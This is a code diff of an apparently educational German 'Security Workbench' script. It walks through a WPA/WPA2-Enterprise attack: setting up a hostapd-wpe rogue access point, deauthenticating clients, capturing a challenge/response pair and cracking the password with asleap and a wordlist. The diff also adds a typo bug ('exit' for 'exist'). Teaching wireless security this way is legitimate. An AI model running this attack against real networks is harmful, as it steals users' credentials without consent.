@@ -73,7 +73,10 @@ def Enterprise_Menu():
 		else:
 			print('Verschlüsselung: WPA2')
 		print("\n")
-
+		##################################################
+		## TODO Refactor fake AP Use Dispro Package
+		## Only Config needed
+		##
 
 		#SWITCHING NETWORK CONFIG
 		print('Anpassen der WIFI-Interfacekonfiguration des Betriebssystems.')
@@ -82,8 +85,13 @@ def Enterprise_Menu():
 		print("Anpassen der Interfaces-Konfiguration.")
 		exist = generics.check_string("/etc/network/interfaces", "iface " + wifi_name + " inet")
 		if(exist==True):
-			generics.find_replace_line("/etc/network/interfaces", "iface " + wifi_name + " inet", "#iface " + wifi_name + " inet")
-			generics.append("/etc/network/interfaces", "iface " + wifi_name + " inet manual")
+			# Check if 
+			exist = generics.check_string("/etc/network/interfaces", "iface " + wifi_name + " inet manual")
+			if(exit==True):
+				print "Interface ist schon auf manuell gesetzt. Wurde die Anwendung vielleicht das letzte mal nicht richtig bendet?\n"
+			else:
+				generics.find_replace_line("/etc/network/interfaces", "iface " + wifi_name + " inet", "#iface " + wifi_name + " inet")
+				generics.append("/etc/network/interfaces", "iface " + wifi_name + " inet manual")
 		else:
 			generics.append("/etc/network/interfaces", "iface " + wifi_name + " inet manual")
 		
@@ -91,25 +99,25 @@ def Enterprise_Menu():
 		generics.restart_networkmanager()
 
 		print shellCols.UNDERLINE + shellCols.HEADER + "Konfigurieren des Fake-Enterprise-Routers" + shellCols.ENDC + '\n'
-		print("Folgende Anpassungen werden vorgenommen (/hostapd-2.2/hostapd/hostapd-wpe.conf):")
+		print("Folgende Anpassungen werden vorgenommen (hostapd-wpe.conf):")
 		print ("Zeile 11: interface="+ wifi_name)
-		generics.replace_line("WIFI/hostapd-2.2/hostapd/hostapd-wpe.conf", 10, "interface="+ wifi_name + "\n")
+		generics.replace_line("WIFI/hostapd-wpe.conf", 10, "interface="+ wifi_name + "\n")
 		print ("Zeile 14: #driver=wired")
-		generics.replace_line("WIFI/hostapd-2.2/hostapd/hostapd-wpe.conf", 13, "#driver=wired"+ "\n")
+		generics.replace_line("WIFI/hostapd-wpe.conf", 13, "#driver=wired"+ "\n")
 		print ("Zeile 25: ssid="+ router_ssid)
-		generics.replace_line("WIFI/hostapd-2.2/hostapd/hostapd-wpe.conf", 24, "ssid="+ router_ssid+ "\n")
+		generics.replace_line("WIFI/hostapd-wpe.conf", 24, "ssid="+ router_ssid+ "\n")
 		print ("Zeile 27: channel="+ router_chn)
-		generics.replace_line("WIFI/hostapd-2.2/hostapd/hostapd-wpe.conf", 26, "channel="+ router_chn+ "\n")
+		generics.replace_line("WIFI/hostapd-wpe.conf", 26, "channel="+ router_chn+ "\n")
 		print ("Zeile 49: wpa="+ str(wpa_mode))
-		generics.replace_line("WIFI/hostapd-2.2/hostapd/hostapd-wpe.conf", 48, "wpa="+ str(wpa_mode)+ "\n")
+		generics.replace_line("WIFI/hostapd-wpe.conf", 48, "wpa="+ str(wpa_mode)+ "\n")
 		print("\n")
 		
 		#START THE FAKE AP
-		command = rlinput('Starten des konfigurierten Fake-Enterprise-Routers und Aufzeichnung eines Authentifikationsversuchs (Liegt ein Versuch bestehend aus Challange und Response vor kann der Prozess beendet werden): \n# ', 'WIFI/startFakeAP.sh' )
+		command = rlinput('Starten des konfigurierten Fake-Enterprise-Routers und Aufzeichnung eines Authentifikationsversuchs (Liegt ein Versuch bestehend aus Challange und Response vor kann der Prozess beendet werden, wenn der AP nicht gestart werden kann muss man zusätlich in einer weiteren Consolle killall wpa_supplicant ausgeführt werden): \n# ', 'WIFI/startFakeAP.sh' )
 		execute(command)
 
 		#WAIT FOR CHALLANGE RESPONSE PAIR
-		print("Wurde ein Authentifikationsversuch aufgezeichnet, kann der Fake-AP heruntergefahren und die Deauthenticate-Attacke beendet werden und es können folgende Parameter ausgefüllt werden:")
+		print("Wurde ein Authentifikationsversuch aufgezeichnet, kann der Fake-AP heruntergefahren und die Deauthenticate-Attacke beendet werden und es können folgende Parameter ausgefüllt werden(Deise müssen aus dem Log des FAKE AP entnohmen werden):")
 		challenge = raw_input("Challenge des Authentifikationsversuch: ").strip()
 		response = raw_input("Response des Authentifikationsversuch: ").strip()
 
@@ -117,7 +125,7 @@ def Enterprise_Menu():
 		#CRACK THE PWD
 		command = rlinput('Knacken des Passwortes mittels eines Wörterbuchangriffs: \n# ', 'asleap -C ' + challenge + " -R " + response + " -W WIFI/dict.txt" )
 		execute(command)
-
+		#!!!! TODO !!!! is not Corekt
 		#REDO INTERFACE CONFIG
 		command = rlinput('Wiederherstellen der Originalkonfiguration: \n# ', 'mv /etc/network/interfaces_restore /etc/network/interfaces' )
 		os.system(command)
@@ -126,7 +134,7 @@ def Enterprise_Menu():
 		
 
 		#END
-		print('Ende des DoS-Tutorials erreicht! \n Bitte wählen zum Fortfahren: \n')
+		print('Ende des WPA/WPA2-Enterprise-Tutorials erreicht! \n Bitte wählen zum Fortfahren: \n')
 		print ('1. Zurück zum Menü \n'
 			+ '2. Zurück zur WPA/WPA2-Enterprise-Übersicht\n' 
 			+ '0. Tutorial beenden \n')
@@ -149,7 +157,8 @@ def sql_signal_handler(signal, frame):
 	if(os.path.isfile("/etc/network/interfaces_restore")):
 		os.system("mv /etc/network/interfaces_restore /etc/network/interfaces")	
 	#ReStart Networkmanager
-	os.system("service network-manager restart")
+	os.system("service networking stop && service network-manager stop")
+	os.system("service networking start && service network-manager start")
 	print('\n\n Die Security Workbench wird beendet ... \n')
 	sys.exit(0)
 
